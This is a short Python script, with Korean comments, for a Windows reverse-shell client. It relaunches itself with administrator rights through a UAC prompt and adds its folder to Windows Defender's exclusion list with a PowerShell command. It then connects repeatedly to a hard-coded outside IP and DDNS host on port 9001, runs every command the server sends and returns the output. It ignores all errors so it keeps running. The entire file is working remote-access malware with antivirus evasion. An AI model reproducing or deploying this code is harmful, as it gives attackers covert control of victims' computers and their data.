import os,socket,subprocess
import time,sys
import win32com.shell.shell as shell
import argparse

### argparser
parser = argparse.ArgumentParser()
parser.add_argument("--port","-p",dest="host_port",help="host's port number",type=int,)

args = parser.parse_args()
if(args.host_port==None):
    print("no host port input error...")
else:
    #print(f"{args.host_port}")
    pass

### UAC to get Admins
print("UAC start...")
if sys.argv[-1] != 'asadmin':
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script]+sys.argv[1:]+['asadmin'])
    shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
    sys.exit(0)

script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
subprocess.call(script,shell=True) #다른프로세스로 실행되기때문에, vscode 또는 cmd 출력을 사용할 수 없습니다.
#os.system("pause")

#### payload



port = 9001 #port of attack_server
print("client start...")

while True:
    try:
        ddns_addr="george.iptime.org"
        #host = "localhost" #address of attack_server
        host = socket.gethostbyname(ddns_addr)
        print(host)
        host = "175.192.214.36"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            print("connected to",host,port)
            while True:
                print("wait for server message...")
                data = s.recv(10000).decode()
                print(f"server sended : {data}")
                if(data[:2]=="cd"):
                    try:
                        os.chdir(str(data[3:]))
                        output=os.getcwd()
                    except Exception as e:
                        output=str(e)
                else:
                    output=subprocess.getoutput(data)
                print(f"output: /{output}/")
                if(output==''): #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
                    s.send("null...".encode())
                s.send(output.encode())
                print("sended!")
                

    except(ConnectionRefusedError,ConnectionResetError):
        print('Connection lost... Retrying in 5 seconds')
        time.sleep(1)
    except:
        pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.
        
